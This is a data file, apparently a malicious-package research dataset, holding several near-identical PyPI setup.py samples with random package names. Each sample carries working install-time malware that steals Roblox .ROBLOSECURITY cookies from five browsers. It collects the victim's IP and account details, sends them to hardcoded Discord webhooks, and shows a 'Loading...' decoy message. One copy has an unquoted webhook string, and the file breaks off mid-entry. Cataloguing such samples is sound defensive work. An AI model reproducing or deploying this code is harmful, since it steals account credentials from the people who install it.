        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolokadyqehtbs', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038471028231385098/Ahvffm0o38deC_39_s730s6Hd9NO_DkHRgozmoEbHfjB8o699D1dm4Zvg3VQlbOHkHVZ' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolokqhufyiwyq",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolokqhufyiwyq', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1023336326428377179/ZNOJPVYQsr0XLGJvED6i0EbgAps6iMeeJjzwskJxHYuWkLnDFLAIZKe7WJ12QFkHkoLY' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolonjucebiwfa",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolonjucebiwfa', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038536133543481446/-wI0lsx6TBhMhzNHRMZ2VyuQ_tPJX4c3hTh5cT_qF2VpcKK3n7IEYQ-fZTyfHvYL0op_' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolookvryqetgd",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolookvryqetgd', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038483407367307294/4o4pATNm3ug6y5--e-D0QOzAldzKUNLCS2A0yfMhrISgaTn14w7vyN86qEaINoaxLJm0' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloqvqexetcqo",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloqvqexetcqo', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038483407367307294/4o4pATNm3ug6y5--e-D0QOzAldzKUNLCS2A0yfMhrISgaTn14w7vyN86qEaINoaxLJm0' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolosbmgfnvgzi",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolosbmgfnvgzi', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038483407367307294/4o4pATNm3ug6y5--e-D0QOzAldzKUNLCS2A0yfMhrISgaTn14w7vyN86qEaINoaxLJm0' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloyfczocogra",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloyfczocogra', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk=https://discord.com/api/webhooks/1023336326428377179/ZNOJPVYQsr0XLGJvED6i0EbgAps6iMeeJjzwskJxHYuWkLnDFLAIZKe7WJ12QFkHkoLY \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloytubfihhsa",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloytubfihhsa', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038471028231385098/Ahvffm0o38deC_39_s730s6Hd9NO_DkHRgozmoEbHfjB8o699D1dm4Zvg3VQlbOHkHVZ' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolozpnyeyhirx",
